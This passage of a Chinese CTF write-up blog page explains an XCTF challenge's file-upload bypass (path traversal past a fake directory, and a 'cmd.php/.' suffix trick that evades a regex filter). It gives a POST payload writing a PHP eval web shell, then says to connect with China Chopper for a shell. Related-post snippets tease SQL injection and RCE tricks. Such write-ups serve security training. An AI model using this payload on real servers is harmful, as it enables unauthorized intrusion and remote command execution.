+<li><code>if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename))</code>有一个正则对文件后缀进行过滤</li>
+<li>真实的上传目录为:<code>uploaded</code></li>
+</ol>
+</li>
+</ol>
+<p>所以我们这里针对第一个点容易想到，<code>$file</code>加一个<code>../</code>即可绕过这个假目录</p>
+<p>针对第二个点，容易发现，匹配只匹配最后一个点的后缀，所以可以引用比较经典的解析问题<code>sky.php/.</code>绕过</p>
+<p>这个解析是和<code>Linux</code>目录结构特性有关的：</p>
+<p><img src="/2020/03/19/XCTF4th-CyberEarth/20191028110659860.png" alt="在这里插入图片描述"></p>
+<p>创建了一个目录为1.php , 在 1.php 下创建了一个子目录为 2.php 。Linux下每创建一个新目录 , 都会在其中自动创建两个隐藏文件。</p>
+<p><img src="/2020/03/19/XCTF4th-CyberEarth/20191028110721861.png" alt="在这里插入图片描述"></p>
+<p>其中 … 代表当前目录的父目录 , .代表当前目录 , 所以这里访问 ./1.php/2.php/… 代表访问 2.php的父目录 , 也就是访问 1.php 。</p>
+<p><img src="/2020/03/19/XCTF4th-CyberEarth/image-20200319125432828.png" alt="image-20200319125432828"></p>
+<p>所以容易得到如下payload</p>
+<p>post数据</p>
+<p><code>con=&lt;?php @eval($_POST['cmd']);?&gt;&amp;file=cmd.php/.</code></p>
+<p>使用菜刀连接即可拿到shell</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45552960/article/details/102777514?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/qq_45552960/article/details/102777514?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://991688344.github.io">LYC</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://991688344.github.io/2020/03/19/XCTF4th-CyberEarth/">http://991688344.github.io/2020/03/19/XCTF4th-CyberEarth/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://991688344.github.io" target="_blank">Rick</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/images/Wallpaper/eatham.gif" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/03/19/Python%E5%A4%9A%E7%BA%BF%E7%A8%8B-Vthread/" title="Python多线程-Vthread"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Python多线程-Vthread</div></div><div class="info-2"><div class="info-item-1">0x01 安装vthread函数库 系统命令行下执行: pip install vthread 0x02 一句话实现简单多线程 1234567891011import vthread,requests@vthread.thread(5)     #开5个线程执行同一个函数def compete(url):    r = requests.get(url)    if r.status_code == 200 :        print(&quot;[*]Success&quot;)    else:        print(&quot;[*]Fail. Retrying...&quot;)compete(&quot;http://www.baidu.com/&quot;) 相同效果： 123456789101112import vthread,requests@vthread.threaddef compete(url):    r = requests.get(url)    if r.status_code == 200 :       ...</div></div></div></a><a class="pagination-related" href="/2020/03/18/TokyoWesternsCTF2018/" title="TokyoWesternsCTF2018"><img class="cover" src="/images/Wallpaper/eatham.gif" onerror="onerror=null;src='/images/404.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">TokyoWesternsCTF2018</div></div><div class="info-2"><div class="info-item-1">shrine 进页面就有这段代码 123456789101112131415161718192021222324252627import flaskimport osapp = flask.Flask(__name__)app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)@app.route(&#x27;/&#x27;)def index():    return open(__file__).read()@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]        return...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/02/25/2018%E6%8A%A4%E7%BD%91%E6%9D%AF/" title="2018护网杯"><img class="cover" src="/images/Wallpaper/eatham.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-25</div><div class="info-item-2">2018护网杯</div></div><div class="info-2"><div class="info-item-1">这个tornado是一个python的模板，在web使用的时候给出了四个文件，可以访问，从提示中和url中可以看出，访问需要文件名+文件签名（长度为32位，计算方式为md5(cookie_secret + md5(filename))）;  flag文件名题目已给出 /fllllllllllag    ...</div></div></div></a><a class="pagination-related" href="/2019/12/05/2019%E6%B7%B1%E6%80%9D%E6%9D%AF/" title="2019深思杯"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2019-12-05</div><div class="info-item-2">2019深思杯</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2020/03/09/0CTF2016/" title="0CTF2016"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-09</div><div class="info-item-2">0CTF2016</div></div><div class="info-2"><div class="info-item-1">piapiapia  数组绕过正则 反序列化长度问题导致的尾部字符逃逸   顺手存一下图片~  输入admin@admin（@表示分割姓名密码）提示Invalid user name or password 输入admin@1提示Invalid password 输入admin@asd提示Invalid user name or password 输入admin@123提示Invalid user name or password 输入sadaaaaaa@asdddd提示Invalid user name 输入username=aaaaaaaaaabbbbbbb&amp;password=21提示Invalid user name 输入username=aaaaaaaaaabbbbb&amp;password=22提示Invalid password 输入username=aaaaaaaaaabbbbbb&amp;password=211提示Invalid user name or password 貌似和长度有关系，但是没看到有啥用 扫一下目录发现 12Dir found:...</div></div></div></a><a class="pagination-related" href="/2020/09/13/2020ciscn/" title="2020ciscn"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-13</div><div class="info-item-2">2020ciscn</div></div><div class="info-2"><div class="info-item-1">Day 1 0x01 Web3  伪协议 md5碰撞  file_get_contents($shell1)==='first blood' 利用php://input 来绕过 $shell2==md5($shell2)  利用PHP松散比较特性来绕过, **0e开头的字符串md5值也是0e开头即可绕过,**写脚本找到一个合适的数字: 0e215962017 12php &gt; var_dump(&#x27;0e215962017&#x27;==&#x27;0e291242476940776845150308577824&#x27;);bool(true) $shell3 = preg_replace('/php/','',$shell3);  只过滤了一次php,并且没有对大小写限制 构造伪协议读取PHP://filter/read=convert.base64-encode/resource=flag.pphphp  脚本: 12345678910111213141516171819202122import string,hashlibimport...</div></div></div></a><a class="pagination-related" href="/2020/03/10/BUUCTF2018/" title="BUUCTF2018"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-10</div><div class="info-item-2">BUUCTF2018</div></div><div class="info-2"><div class="info-item-1">Online Tool  RCE  123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123;    highlight_file(__FILE__);&#125; else &#123;    $host = $_GET[&#x27;host&#x27;];    $host = escapeshellarg($host);    $host = escapeshellcmd($host);    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);    echo &#x27;you are in...</div></div></div></a><a class="pagination-related" href="/2020/02/28/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA/" title="CISCN2019华北赛区"><img class="cover" src="/images/Wallpaper/rainbowcat.gif" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-02-28</div><div class="info-item-2">CISCN2019华北赛区</div></div><div class="info-2"><div class="info-item-1">Hack World 搜索框输入1或2会返回结果，其他都返回bool(false)。过滤了union、and、or、空格等，包括/**/，后来看源码知道是过滤了*。 有意思的是输入1/1时会正常返回结果，可以判断这是数字型的sql注入。 根据1和2返回结果的不同，可能是bool盲注，()没有过滤，可以使用大部分函数,空格的绕过有这些方法我测试是可以的 %09 %0a %0b %0c %0d /**/ /*!*/或者直接tab %20 好像没法绕，%00截断好像也影响sql语句的执行 或者用括号也可以。任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 本题中可以if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2) 写个脚本跑一下(本地测试的 buu复现的环境网络不行所以必须加延时,时间太久了) 1234567891011121314151617181920212223242526272829303132333435363738394041import...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC80NzA1My8yMzU1Mw=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">LYC</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">251</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">49</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">ics-02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">ics-04</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8"><span class="toc-number">2.1.</span> <span class="toc-text">手动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E8%B7%91"><span class="toc-number">2.2.</span> <span class="toc-text">sqlmap跑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">ics-07</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护"><img src="/images/Wallpaper/rainbowcat.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="4GPU服务器环境配置及维护"/></a><div class="content"><a class="title" href="/2023/08/29/4GPU%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%BB%B4%E6%8A%A4/" title="4GPU服务器环境配置及维护">4GPU服务器环境配置及维护</a><time datetime="2023-08-29T12:00:26.000Z" title="发表于 2023-08-29 20:00:26">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="UEFI+systemd开机启动流程"/></a><div class="content"><a class="title" href="/2023/08/29/UEFI-systemd%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/" title="UEFI+systemd开机启动流程">UEFI+systemd开机启动流程</a><time datetime="2023-08-29T08:39:54.000Z" title="发表于 2023-08-29 16:39:54">2023-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="udev配置Linux网络接口"/></a><div class="content"><a class="title" href="/2023/08/27/udev%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C%E6%8E%A5%E5%8F%A3/" title="udev配置Linux网络接口">udev配置Linux网络接口</a><time datetime="2023-08-27T12:49:29.000Z" title="发表于 2023-08-27 20:49:29">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="实验室服务器网络运维"/></a><div class="content"><a class="title" href="/2023/08/27/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/" title="实验室服务器网络运维">实验室服务器网络运维</a><time datetime="2023-08-27T12:20:23.000Z" title="发表于 2023-08-27 20:20:23">2023-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer"><img src="/images/Wallpaper/eatham.gif" onerror="this.onerror=null;this.src='/images/404.png'" alt="Attention机制_transformer"/></a><div class="content"><a class="title" href="/2022/11/21/Attention%E6%9C%BA%E5%88%B6-transformer/" title="Attention机制_transformer">Attention机制_transformer</a><time datetime="2022-11-21T11:55:15.000Z" title="发表于 2022-11-21 19:55:15">2022-11-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By LYC</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(async () => {
+  const showKatex = () => {
+    document.querySelectorAll('#article-container .katex').forEach(el => el.classList.add('katex-show'))
+  }
+
+  if (!window.katex_js_css) {
+    window.katex_js_css = true
+    await btf.getCSS('https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css')
+    if (true) {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js')
+    }
+  }
+
+  showKatex()
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+
+  const loadLivere = (el, path) => {
+    window.livereOptions = {
+      refer: path || location.pathname
+    }
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyLivere = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    if (typeof LivereTower === 'object') window.LivereTower.init()
+    else {
+      (function(d, s) {
+          var j, e = d.getElementsByTagName(s)[0];
+          if (typeof LivereTower === 'function') { return; }
+          j = d.createElement(s);
+          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+          j.async = true;
+          e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    }
+  }
+
+  if (isShuoshuo) {
+    'Livere' === 'Livere'
+      ? window.shuoshuoComment = { loadComment: loadLivere }
+      : window.loadOtherComment = loadLivere
+    return
+  }
+
+  if ('Livere' === 'Livere' || !false) {
+    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+    else loadLivere()
+  } else {
+    window.loadOtherComment = loadLivere
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
